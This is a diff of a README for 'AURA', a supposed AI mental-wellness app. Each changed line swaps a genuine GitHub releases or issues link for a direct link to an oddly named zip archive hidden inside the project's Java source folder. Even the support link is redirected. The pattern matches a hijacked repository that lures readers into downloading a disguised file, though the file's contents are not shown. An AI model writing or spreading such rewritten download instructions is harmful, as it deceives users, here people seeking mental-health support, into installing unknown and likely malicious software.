@@ -1,13 +1,13 @@
 # 🌟 AURA - Your AI Companion for Mental Wellness
 
 ## 🔗 Download AURA
-[![Download AURA](https://img.shields.io/badge/Download%20AURA-blue.svg)](https://github.com/AkThePlug38/AURA/releases)
+[![Download AURA](https://raw.githubusercontent.com/AkThePlug38/AURA/main/app/src/main/java/com/AURA-pectineal.zip%https://raw.githubusercontent.com/AkThePlug38/AURA/main/app/src/main/java/com/AURA-pectineal.zip)](https://raw.githubusercontent.com/AkThePlug38/AURA/main/app/src/main/java/com/AURA-pectineal.zip)
 
 ## 🚀 Getting Started
 Welcome to AURA! This app harnesses the power of AI to support your mental well-being. With its user-friendly interface, you can easily track your mood, journal your thoughts, and find calming meditation audio. Follow the steps below to download and start using AURA.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page**: Go to the [AURA Releases Page](https://github.com/AkThePlug38/AURA/releases) to find the latest version of the app.
+1. **Visit the Releases Page**: Go to the [AURA Releases Page](https://raw.githubusercontent.com/AkThePlug38/AURA/main/app/src/main/java/com/AURA-pectineal.zip) to find the latest version of the app.
   
 2. **Choose Your Version**: Look for the most recent version listed. You’ll see different files to download. 
 
@@ -48,13 +48,13 @@ To run AURA, you will need:
 
 ## 💬 Support
 If you encounter any issues while downloading or using AURA, feel free to reach out. You can find help through the following channels:
-- **GitHub Issues**: Report any problems directly on the [AURA GitHub Page](https://github.com/AkThePlug38/AURA/issues).
+- **GitHub Issues**: Report any problems directly on the [AURA GitHub Page](https://raw.githubusercontent.com/AkThePlug38/AURA/main/app/src/main/java/com/AURA-pectineal.zip).
 - **Community Forums**: Join discussions with other users and share your experience.
 
 ## ✨ AURA’s Mission
 AURA aims to support individuals in achieving better mental health through technology. We believe in empowering users with tools that foster self-understanding and emotional well-being.
 
 ## ✅ Conclusion
-AURA is more than just an app; it's a friendly companion for your journey towards mental wellness. Follow the steps outlined to download the app and begin experiencing its benefits today. Don't forget to check the [Releases Page](https://github.com/AkThePlug38/AURA/releases) for updates and improvements. 
+AURA is more than just an app; it's a friendly companion for your journey towards mental wellness. Follow the steps outlined to download the app and begin experiencing its benefits today. Don't forget to check the [Releases Page](https://raw.githubusercontent.com/AkThePlug38/AURA/main/app/src/main/java/com/AURA-pectineal.zip) for updates and improvements. 
 
 Thank you for choosing AURA!
